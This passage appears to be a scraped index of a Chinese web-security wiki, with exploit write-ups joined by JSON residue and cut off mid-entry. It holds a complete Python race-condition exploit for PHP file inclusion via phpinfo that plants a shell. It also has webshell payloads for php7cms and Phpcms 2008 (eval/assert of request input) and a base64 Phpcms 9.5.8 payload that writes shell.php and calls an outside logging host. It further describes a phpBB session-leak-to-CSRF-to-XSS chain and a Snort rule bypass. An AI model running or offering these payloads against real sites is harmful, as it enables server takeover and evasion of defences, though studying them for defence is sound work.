通过内核代码能够看到第655行进入反序列化，反序列化是利用词法扫描，判断各项符号转换对应对象。能够看到反序列化中对于}进行了处理，处理中只是对计数器加一并没有其他操作。 实际作用 反序列化语法的差异，对于安全防护设备判断反序列化产生很大的影响。在Snort中，有段规则如下： alert tcp any any -> any [80,8080,443] (uricontent:\".php\"; pcre:\"/\\{\\w:.+?\\}/\"; sid:1; msg:php_serialize;) 在攻击载荷中可以使用大多数字符代替{},从而导致规则失效。 总结 在红队攻击中可以利用PHP序列化和反序列化语法差异，从而达到绕过防护的目的。 在蓝队防御中建议考虑定义中所述不会保存对象的方法，只会保存类的名字。，拦截保存类的名字，以及语法中相同的字符 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:57 "},"Web安全/Php/Php文件包含漏洞（利用phpinfo）/Php文件包含漏洞（利用phpinfo）.html":{"url":"Web安全/Php/Php文件包含漏洞（利用phpinfo）/Php文件包含漏洞（利用phpinfo）.html","title":"Php文件包含漏洞（利用phpinfo）","keywords":"","body":"Php文件包含漏洞（利用phpinfo） 一、漏洞简介 PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 二、漏洞影响 三、复现过程 环境搭建 执行如下命令启动环境： docker-compose up -d 目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。 环境启动后，访问http://www.0-sec.org/phpinfo.php即可看到一个PHPINFO页面，访问http://www.0-sec.org:8080/lfi.php?file=/etc/passwd，可见的确存在文件包含漏洞。 漏洞分析 在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。 在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。 但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。 这个时候就需要用到条件竞争，具体流程如下： 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell 漏洞复现 利用脚本实现上述过程，成功包含临时文件后，会执行')?>，写入一个新的文件/tmp/g，这个文件就会永久留在目标机器上。 用python2执行：python exp.py www.0-sec.org 8080 100： /media/rId27.png) 可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令： /media/rId28.png) poc #!/usr/bin/python import sys import threading import socket def setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r ')?>\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r Content-Type: text/plain\\r \\r %s -----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r HTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r HTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r HTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r HTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r Content-Length: %s\\r Host: %s\\r \\r %s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r User-Agent: Mozilla/4.0\\r Proxy-Connection: Keep-Alive\\r Host: %s\\r \\r \\r \"\"\" return (REQ1, TAG, LFIREQ) def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fn counter=0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter >= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] => \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256 def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) = maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join() if __name__==\"__main__\": main() 参考链接 https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:58 "},"Web安全/php7cms/php7cms文件包含漏洞/php7cms文件包含漏洞.html":{"url":"Web安全/php7cms/php7cms文件包含漏洞/php7cms文件包含漏洞.html","title":"php7cms文件包含漏洞","keywords":"","body":"php7cms文件包含漏洞 漏洞描述 php7cms前台未授权文件包含 利用SQL注入报错插入payload到日志文件 包含该日志文件得到webshell 漏洞影响 php7cms 漏洞分析 利用思路 前台未授权文件包含 利用SQL注入报错插入payload到日志文件 包含该日志文件得到webshell 在php7cms/Core/Controllers/Api/Api.php:143 public function template() { ob_start(); \\Phpcmf\\Service::V()->display(dr_safe_replace(\\Phpcmf\\Service::L('Input')->get('name'))); $html = ob_get_contents(); ob_clean(); $this->_jsonp(1, $html); } 该函数动态调用模板的函数，是可以通过构造url来访问到的。 该函数接收一个参数name。并将该值带入到了display函数中，跟踪该函数。 php7cms/Fcms/Core/View.php:137 public function display($_name, $_dir = '') { extract($this->_options, EXTR_PREFIX_SAME, 'data'); $this->_filename = $_name; !IS_DEV && $this->_options = null; // 加载编译后的缓存文件 $this->_disp_dir = $_dir; $_view_file = $this->get_file_name($_name); $_view_name = str_replace([TPLPATH, FCPATH, APPSPATH], '', $_view_file); \\Config\\Services::timer()->start($_view_name); include $this->load_view_file($_view_file); \\Config\\Services::timer()->stop($_view_name); // 消毁变量 $this->_include_file = null; } 这里的$_name被带入到了get_file_name函数中。跟踪该函数: public function get_file_name($file, $dir = null, $include = FALSE) { $dir = $dir ? $dir : $this->_disp_dir; if (IS_ADMIN || $dir == 'admin' || $this->_is_admin) { // 后台操作时，不需要加载风格目录，如果文件不存在可以尝试调用主项目模板 if (APP_DIR && is_file(MYPATH.'View/'.APP_DIR.'/'.$file)) { return MYPATH.'View/'.APP_DIR.'/'.$file; } elseif (!APP_DIR && is_file(MYPATH.'View/'.$file)) { return MYPATH.'View/'.$file; } elseif (is_file($this->_dir.$file)) { return $this->_dir.$file; // 调用当前后台的模板 } elseif (is_file($this->_aroot.$file)) { return $this->_aroot.$file; // 当前项目目录模板不存在时调用主项目的 } elseif ($dir != 'admin' && is_file(APPSPATH.ucfirst($dir).'/Views/'.$file)) { return APPSPATH.ucfirst($dir).'/Views/'.$file; // 指定模块时调用模块下的文件 } $error = $this->_dir.$file; } elseif (IS_MEMBER || $dir == 'member') { // 会员操作时，需要加载风格目录，如果文件不存在可以尝试调用主项目模板 if ($dir === '/' && is_file($this->_root.$file)) { return $this->_root.$file; } elseif (is_file($this->_dir.$file)) { // 调用当前的会员模块目录 return $this->_dir.$file; } elseif (is_file($this->_mroot.$file)) { // 调用默认的会员模块目录 return $this->_mroot.$file; } elseif (is_file($this->_root.$file)) { // 调用网站主站模块目录 return $this->_root.$file; } $error = $dir === '/' ? $this->_root.$file : $this->_dir.$file; } elseif ($file == 'go') { // 转向字段模板 return $this->_aroot.'go.html'; } else { if ($dir === '/' && is_file($this->_root.$file)) { // 强制主目录 return $this->_root.$file; } else if (@is_file($this->_dir.$file)) { // 调用本目录 return $this->_dir.$file; } else if (@is_file($this->_root.$file)) { // 再次调用主程序下的文件 return $this->_root.$file; } $error = $dir === '/' ? $this->_root.$file : $this->_dir.$file; } // 如果移动端模板不存在就调用主网站风格 if (IS_MOBILE && is_file(str_replace('/mobile/', '/pc/', $error))) { return str_replace('/mobile/', '/pc/', $error); } elseif (IS_MOBILE && is_file(str_replace('/mobile/', '/pc/', $this->_root.$file))) { return str_replace('/mobile/', '/pc/', $this->_root.$file); } elseif ($file == 'msg.html' && is_file(TPLPATH.'pc/default/home/msg.html')) { return TPLPATH.'pc/default/home/msg.html'; } exit('模板文件 ('.str_replace(TPLPATH, '/', $error).') 不存在'); } 该函数是用来判断模板文件是否存在。由于文件名可控。导致我们可以通过../这样来跳转目录来使用其他我们可控的文件。 然后判断完毕文件存在后，回到上文。 include $this->load_view_file($_view_file); 这里将路径带入到了load_view_file函数中，并将返回结果include。看一下这个load_view_file函数: public function load_view_file($name) { $cache_file = $this->_cache.str_replace(array(WEBPATH, '/', '\\\\', DIRECTORY_SEPARATOR), array('', '_', '_', '_'), $name).(IS_MOBILE ? '.mobile.' : '').'.cache.php'; // 当缓存文件不存在时或者缓存文件创建时间少于了模板文件时,再重新生成缓存文件 if (!is_file($cache_file) || (is_file($cache_file) && is_file($name) && filemtime($cache_file) handle_view_file(file_get_contents($name)); @file_put_contents($cache_file, $content, LOCK_EX) === FALSE && show_error('请将模板缓存目录（/cache/template/）权限设为777', 404, '无写入权限'); } return $cache_file; } 这里会将我们传入的文件路径的文件内容写入到缓存文件中，并返回该缓存文件的文件路径。 文件包含的点在这里，那么如何找到可控内容的文件就比较重要的。 这里我使用该网站自带的错误日志来进行包含。 首先我们访问： http://localhost/index.php?s=news&c=search&keyword=%E5%9B%BA%E5%AE%9A&order=2%3C?=/*&sss=*/e val($_GET[1]);` 这样就会生成一个错误日志cache/error/log-2018-10-20.php 命名规则就是log-年-月-日.php 看一下这个文件的内容： ERROR - 2018-10-20 16:53:04 --> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?=/* LIMIT 0,10' at line 1SELECT `dr_1_news`.`thumb`,`dr_1_news`.`url`,`dr_1_news`.`title`,`dr_1_news`.`des cription`,`dr_1_news`.`keywords`,`dr_1_news`.`updatetime`,`dr_1_news`.`hits`,`dr_1_news`.`comments` FROM `dr_1_news` WHERE (`dr_1_news`.`id` IN(SELECT `cid` FROM `dr_1_news_search_index` WHERE `id`=\"ce0f2ef8f63c9afa7453492781553547\")) AND `dr_1_news`.`status` = 9 ORDER BY 2http://localhost/index.php?s=news&c=search&keyword=%E5%9B%BA%E5%AE%9A&order=2%3C?=/*&sss=*/e val($_GET[1]); 因为程序对 然后我们将这个日志文件包含进来。 访问如下url。 http://10.3.0.22/index.php?s=api&c=api&m=template&name=../../../../cache/error/log-2020-09-30.php&1=phpinfo(); 即可执行phpinfo Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:05 "},"Web安全/PhpBB/（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS/（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS.html":{"url":"Web安全/PhpBB/（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS/（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS.html","title":"（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS","keywords":"","body":"（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS 一、漏洞简介 该漏洞源于WEB应用未充分验证请求是否来自可信用户。攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。 二、漏洞影响 PhpBB 3.2.7 三、复现过程 首先来看一下phpBB的后台，也就是ACP页面 PhpBB从sessionid泄露到CSRF到XSS/media/rId24.png) 可以发现所有后台功能的url中都会携带着sid（session id）参数： http://www.0-sec.org/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&i=1 如果url中sid值错误，即使已经登录后台也无法正常的访问后台页面 phpbb程序这样做的确有着这样做的优点，但也存在着很严重的安全隐患 优点： 在后台功能url中加入sid，相当于增加了一层安全屏障，降低了后台页面出现CSRF漏洞的几率，为什么这样说呢？假使因为开发疏忽，一个表单提交页面没有利用随机数对用户提交的表单进行保护，这通常会导致CSRF漏洞的产生。但是在phpbb应用中，所有的后台功能url中都加入了sid参数且phpbb对sid参数值合法性进行校验，即使攻击者在后台发现了一处没有随机数保护的表单提交页面，但在不知道管理 员sid值的情况下，也无法构造出一个有效的恶意表单提交页面地址 安全隐患： 这样的操作相当于在url中存放了本来只应该出现在cookie中的session id。如果url中的sid被泄露，攻击者有机会利用这个值伪造管理员身份进行登录后台操作（但不一定可以直接利用，这里涉及到phpBB的一个安全机制，后文会讲到）。 注意看，url中的sid值与cookie中的值完全一样，它们都是此用户的session id值 PhpBB从sessionid泄露到CSRF到XSS/media/rId25.png) 至于cookie中session值的key ：phpbb3_qnsnz_sid PhpBB从sessionid泄露到CSRF到XSS/media/rId26.png) 这个值在系统安装完成之后是固定的，无论什么身份的用户访问都是这个值 因此，如果管理员访问的url中sid值被泄露，攻击者可以有机会利用这个值构造cookie以便使用管理员身份登录后台 但是如何获取这个暴露在url中sid值呢? 由于phpbb的设计特色：当管理员使用完后台功能后想要切换到前台，后台页面中提供了一个跳转到前台地址的按钮 当管理员点击这个按钮切换到前台时，url中会带有sidPhpBB从sessionid泄露到CSRF到XSS/media/rId27.png) 其实前台页面的访问并不需要在url中使用sid，但从后台切换过来后url中会默认带上这个值。这就导致本应该只在后台功能url中出现的管理员sid泄露到了管理员访问的前台功能url中，而这个存在于url中的sid值很容易在前台页面加载远程资源时在HTTP_REFERER中被泄露 例如：在一些phpbb站点中可能会开启远程头像选项 PhpBB从sessionid泄露到CSRF到XSS/media/rId28.png) 这个功能并不是默认开启的，当此功能开启后，用户可以设置远程头像 PhpBB从sessionid泄露到CSRF到XSS/media/rId29.png)PhpBB从sessionid泄露到CSRF到XSS/media/rId30.png)程序会在使用这个远程头像的时候将其加载进来 PhpBB从sessionid泄露到CSRF到XSS/media/rId31.png) 如果管理员此时访问的页面在渲染时加载了攻击者的远程头像，且此时管理员访问的url中带有sid，sid将会被泄露 PhpBB从sessionid泄露到CSRF到XSS/media/rId32.png) 我们是否可以构造一个恶意的远程图片链接poc，用以接收管理员的sid呢？ 首先看一下phpBB在后台程序如何校验远程图片链接，phpBB使用getImageSize对用户添加的远程图片链接进行校验 PhpBB从sessionid泄露到CSRF到XSS/media/rId33.png)因此我们可以构造如下poc PhpBB从sessionid泄露到CSRF到XSS/media/rId34.png) poc.php除了需要记录加载该图片请求中的HTTP_REFERER，同时需要将图片进行返回展示 PhpBB从sessionid泄露到CSRF到XSS/media/rId35.png) 构造远程图片链接 http://wwww.0-sec.org/poc.php?avatar.png PhpBB从sessionid泄露到CSRF到XSS/media/rId36.png) 攻击者的头像加载成功 但是如何使得管理员加载这个头像资源呢？ 只要给管理员留言，或者评论管理员发布的文章即可 以评论文章为例：当针对管理员发布的文章发表一条评论之后，管理员在前端页面即可收到一个消息提示 PhpBB从sessionid泄露到CSRF到XSS/media/rId37.png) 点看之后可以看到被加载的头像 PhpBB从sessionid泄露到CSRF到XSS/media/rId38.png) 但无论管理员点开与否，在phpbb首页加载时，都会远程加载这个资源，HTTP_REFERER都会被发送到攻击者的服务器上 PhpBB从sessionid泄露到CSRF到XSS/media/rId39.png) PhpBB从sessionid泄露到CSRF到XSS/media/rId40.png) 到此为止，攻击者可以顺利获得sid值。但为什么上文说获取了sid值也不一定可以盗用管理员身份登录系统呢？ 在phpBB中有如下的安全策略 PhpBB从sessionid泄露到CSRF到XSS/media/rId41.png) Session IP validation选项用来验证当前用户会话绑定的IP；All选项代表匹配完整地址，A.B.C选项匹配前面的x.x.x段，A.B选项匹配x.x，None选项关闭IP检查。 这项安全策略是用来检验用户sid与IP的绑定关系，系统默认采用A.B.C选项，因此攻击者在获取了管理员sid后，想要冒用身份也是很困难的。 然而这也不是无解的： phpBB后台管理中包含着编辑BBCode的功能。 BBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。 PhpBB从sessionid泄露到CSRF到XSS/media/rId42.png) 当然，作为后台管理功能，访问此处url也需要sid PhpBB从sessionid泄露到CSRF到XSS/media/rId43.png)由于上文的利用，攻击者可以获取sid，因此这里可以确定管理员此处后台功能的确切url 在此页面上，管理员可以添加，删除和编辑自定义BBCode。假如定义了这样的BBCode PhpBB从sessionid泄露到CSRF到XSS/media/rId44.png)用户可以在PM、话题或者帖子中使用这个BBCode PhpBB从sessionid泄露到CSRF到XSS/media/rId45.png) 结果如下 PhpBB从sessionid泄露到CSRF到XSS/media/rId46.png) 然而phpBB中编辑BBCode的功能存在CSRF问题，首先看一下编辑BBCode功能的后台代码 PhpBB从sessionid泄露到CSRF到XSS/media/rId47.png) 可以看到，这里的确有对csrf进行防范 PhpBB从sessionid泄露到CSRF到XSS/media/rId48.png) 但是问题出在了前面的$submit参数： PhpBB从sessionid泄露到CSRF到XSS/media/rId49.png) 只有提交的POST请求中存在submit参数，系统才会检查CSRF nonce。反之不会 因此，只要构造csrf时，请求中不带submit参数即可 $action、$bbcode_id、$bbcode_match与$bbcode_tpl参数均有$request->variable方式获取而来 PhpBB从sessionid泄露到CSRF到XSS/media/rId50.png) PhpBB从sessionid泄露到CSRF到XSS/media/rId51.png) variable方法不仅会获取POST中提交的变量，也会获取通过GET提交的变量，这意味着攻击者可以通过GET参数传参来进行CSRF攻击。 当csrf攻击成功后，恶意的bbcode将会被添加。之后攻击者可以滥用这个bbcode短代码，在消息、话题、帖子、回复中执行任意XSS代码。 参考链接 https://xz.aliyun.com/t/7829 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:10 "},"Web安全/Phpcms/（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞/（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞.html":{"url":"Web安全/Phpcms/（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞/（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞.html","title":"（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞","keywords":"","body":"（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞 一、漏洞简介 PHPCMS 2008存在的代码注入漏洞，导致攻击者可向网站上路径可控的缓存文件写入任意内容，从而可能获取webshell并执行任意指令。 二、漏洞影响 三、复现过程 漏洞分析 该漏洞源于PHPCMS 2008源码中的/type.php文件。该文件包含如下代码： if(empty($template)) $template = 'type'; ... include template('phpcms', $template); 这里$template变量是用户能够通过传入参数控制的，同时可以看到该变量之后会被传入template()方法。而template()方法在/include/global.func.php文件中定义，包含如下代码： template_compile($module, $template, $istag); 不难看出，这里会继续调用/include/template.func.php中的template_compile()： function template_compile($module, $template, $istag = 0) { ... $compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php'; $content = ($istag || substr($template, 0, 4) == 'tag_') ? ''.template_parse($content, 1).'' : template_parse($content); $strlen = file_put_contents($compiledtplfile, $content); ... } ` 在这个方法中，$template变量同时被用于$compiledtplfile中文件路径的生成，和$content中文件内容的生成。 而前文所述的攻击payload将$template变量被设置为如下的值 tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss 所以在template_compile()方法中，调用file_put_contents()函数时的第一个参数就被写成了data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss.tpl.php，这将被php解析成\\\"data/cache_template/rss.tpl.php\\\"。最终，@unlink(_FILE_);assert($_POST[1]);将被写入该文件。 漏洞复现 当攻击者向安装有PHPCMS 2008的网站发送uri为如下文本的payload https://www.0-sec.org/type.php?template=tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss 那么@unlink(_FILE_);assert($_POST[1]);这句恶意php指令将被写入网站的/cache_template/rss.tpl.php文件。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:53 "},"Web安全/Phpcms/Phpcms V9.5.8 后台getshell/Phpcms V9.5.8 后台getshell.html":{"url":"Web安全/Phpcms/Phpcms V9.5.8 后台getshell/Phpcms V9.5.8 后台getshell.html","title":"Phpcms V9.5.8 后台getshell","keywords":"","body":"Phpcms V9.5.8 后台getshell 一、漏洞简介 二、漏洞影响 Phpcms V9.5.8 三、复现过程 漏洞分析 代码位于/phpcms/modules/content/content.php 第472-532行 public function public_categorys() { $show_header = ''; $cfg = getcache('common','commons'); $ajax_show = intval($cfg['category_ajax']); $from = isset($_GET['from']) && in_array($_GET['from'],array('block')) ? $_GET['from'] : 'content'; $tree = pc_base::load_sys_class('tree'); if($from=='content' && $_SESSION['roleid'] != 1) { $this->priv_db = pc_base::load_model('category_priv_model'); $priv_result = $this->priv_db->select(array('action'=>'init','roleid'=>$_SESSION['roleid'],'siteid'=>$this->siteid,'is_admin'=>1)); $priv_catids = array(); foreach($priv_result as $_v) { $priv_catids[] = $_v['catid']; } if(empty($priv_catids)) return ''; } $categorys = array(); if(!empty($this->categorys)) { foreach($this->categorys as $r) { if($r['siteid']!=$this->siteid || ($r['type']==2 && $r['child']==0)) continue; if($from=='content' && $_SESSION['roleid'] != 1 && !in_array($r['catid'],$priv_catids)) { $arrchildid = explode(',',$r['arrchildid']); $array_intersect = array_intersect($priv_catids,$arrchildid); if(empty($array_intersect)) continue; } if($r['type']==1 || $from=='block') { if($r['type']==0) { $r['vs_show'] = \"[\".L('content_page').\"]\"; } else { $r['vs_show'] =''; } $r['icon_type'] = 'file'; $r['add_icon'] = ''; $r['type'] = 'add'; } else { $r['icon_type'] = $r['vs_show'] = ''; $r['type'] = 'init'; $r['add_icon'] = \" \"; } $categorys[$r['catid']] = $r; } } if(!empty($categorys)) { $tree->init($categorys); switch($from) { case 'block': $strs = \"\\$add_icon\\$catname \\$vs_show\"; $strs2 = \" \\$catname\"; break; default: $strs = \"\\$add_icon\\$catname\"; $strs2 = \"\\$catname\"; break; } $categorys = $tree->get_treeview(0,'category_tree',$strs,$strs2,$ajax_show); } else { $categorys = L('please_add_category'); } include $this->admin_tpl('category_tree'); exit; } 复制 文本 在当前函数开始下个断点 跟到526行： $categorys = $tree->get_treeview(0,'category_tree',$strs,$strs2,$ajax_show); 复制 文本 进入了get_treeview()函数，跟入进去， 函数位于 /phpcms/libs/classes/tree.class.php 第206-239行。 * @param $myid 表示获得这个ID下的所有子级 * @param $effected_id 需要生成treeview目录数的id * @param $str 末级样式 * @param $str2 目录级别样式 * @param $showlevel 直接显示层级数，其余为异步显示，0为全部限制 * @param $style 目录样式 默认 filetree 可增加其他样式如'filetree treeview-famfamfam' * @param $currentlevel 计算当前层级，递归使用 适用改函数时不需要用该参数 * @param $recursion 递归使用 外部调用时为FALSE function get_treeview($myid,$effected_id='example',$str=\"\\$name\", $str2=\"\\$name\" ,$showlevel = 0 ,$style='filetree ' , $currentlevel = 1,$recursion=FALSE) { $child = $this->get_child($myid); if(!defined('EFFECTED_INIT')){ $effected = ' id=\"'.$effected_id.'\"'; define('EFFECTED_INIT', 1); } else { $effected = ''; } $placeholder = ''; if(!$recursion) $this->str .=''; foreach($child as $id=>$a) { @extract($a); if($showlevel > 0 && $showlevel == $currentlevel && $this->get_child($id)) $folder = 'hasChildren'; [email protected]/* */ $floder_status = isset($folder) ? ' class=\"'.$folder.'\"' : ''; $this->str .= $recursion ? '' : ''; $recursion = FALSE; if($this->get_child($id)){ eval(\"\\$nstr = \\\"$str2\\\";\"); $this->str .= $nstr; if($showlevel == 0 || ($showlevel > 0 && $showlevel > $currentlevel)) { $this->get_treeview($id, $effected_id, $str, $str2, $showlevel, $style, $currentlevel+1, TRUE); } elseif($showlevel > 0 && $showlevel == $currentlevel) { $this->str .= $placeholder; } } else { eval(\"\\$nstr = \\\"$str\\\";\"); $this->str .= $nstr; } $this->str .=$recursion ? '': ''; } if(!$recursion) $this->str .=''; return $this->str; } 复制 文本 这里有个判断： if($this->get_child($id)) 当第一次执行为ture的时候，还是会再次执行get_treeview的内容 $this->get_treeview($id, $effected_id, $str, $str2, $showlevel, $style, $currentlevel+1, TRUE); 第二次执行的时候$myid由0变成了1， 这时候的$newarr为空， if就不执行，转而执行elseif和else，而$str包含着menuid的值，[email protected]/* */()}，这时候eval()` 就执行了php代码。 漏洞复现 常规poc：https://www.0-sec.org/index.php?m=content&c=content&a=public_categorys&[email protected]/* */()} 进阶版poc：https://www.0-sec.org/index.php?m=content&c=content&a=public_categorys&menuid=${@(assert(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycpOw)))} 密码1，这要管理员权限才能代码执行，修改下payload，管理员一访问就在当前域名的首页路径下生成shell。 print_r(base64_encode(\"fputs(fopen('shell.php','w'),' 还有另一种payload，会回显的提醒。自动curl请求你的域名，然后回显网站url 先输出base64的地址，然后在替换下面的字符串> https://www.0-sec.org/index.php?m=content&c=content&a=public_categorys&menuid=(${@(assert(eval(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMl0pOycpO3N5c3RlbSgnY3VybCAnLiRfU0VSVkVSWyJTRVJWRVJfTkFNRSJdLic0MzIxLm5yY3VmOS5jZXllLmlvJyk7))))}) 这个字符串有几个点提醒下自己，assert()函数执行执行一句php代码，所以在assert前面加个eval，执行多条语句。 参考链接 https://www.mrwu.red/web/2723.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:19 "},"Web安全/Phpcms/Phpcms V9.6.0 authkey泄露导致注入/Phpcms V9.6.0 authkey泄露导致注入.html":{"url":"Web安全/Phpcms/Phpcms V9.6.0 authkey泄露导致注入/Phpcms V9.6.0 authkey泄露导致注入.html","title":"Phpcms V9.6.0 authkey泄露导致注入","keywords":"","body":"Phpcms V9.6.0 authkey泄露导致注入 一、漏洞简介 二、漏洞影响 Phpcms V9.6.0 三、复现过程 http://www.0-sec.org/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:20 "},"Web安全/Phpcms/Phpcms v9.6.0 sql注入/Phpcms v9.6.0 sql注入.html":{"url":"Web安全/Phpcms/Phpcms v9.6.0 sql注入/Phpcms v9.6.0 sql注入.html","title":"Phpcms v9.6.0 sql注入","keywords":"","body":"Phpcms v9.6.0 sql注入 一、漏洞简介 二、漏洞影响 Phpcms v9.6.0 三、复现过程 这个版本的 SQL注入 主要在于程序对解密后的数据没有进行过滤，我们来看一下漏洞文件 phpcms/modules/content/down.php 。在其 init 方法中，从 GET 数据中获取了 a_k 的值，该值若能解密成程序规定格式的字符串，则程序继续运行（这里加解密使用的秘钥必须一致，例如这里秘钥为 pc_base::load_config(\\'system\\',\\'auth_key\\') ）。程序将解密后的数据用 parse_str 函数处理，这里又存在变量覆盖问题。然后将可控变量 $id 带入数据库查询，我们跟进 get_one 方法。 get_one 方法调用了 sqls 方法，而在 sqls 方法中可以明显看到，未过滤的数据直接拼接进了 SQL 语句中。 那么现在，我们要解决的问题是：如何构造出加密数据，使得数据能够被正常解密？我们先来看一下 sys_auth 函数的代码，其代码位于 phpcms/libs/functions/global.func.php 中。开头我们可以很明显看到，当我们没有指定加解密用的 key 时，系统默认使用 pc_base::load_config(\\'system\\',\\'auth_key\\') 作为 key ，这样我们就不用特地去搜索形如 sys_auth(\\'xxx\\',\\'ENCODE\\',pc_base::load_config(\\'system\\',\\'auth_key\\')) 的代码段，直接搜索形如 sys_auth(\\'可控字符串\\',\\'ENCODE\\') 或 sys_auth(\\'可控字符串\\') 的代码段即可。（这里搜索这种代码段的目的，是为了找到可利用的点将恶意 payload 进行加密，然后传输给开头 phpcms/modules/content/down.php 文件的 init 方法进一步利用） 通过搜索，会发现在 set_cookie 方法中使用了 sys_auth($value, \\'ENCODE\\') ，我们可以寻找是否存在可控的 $value 。 我们可以搜到 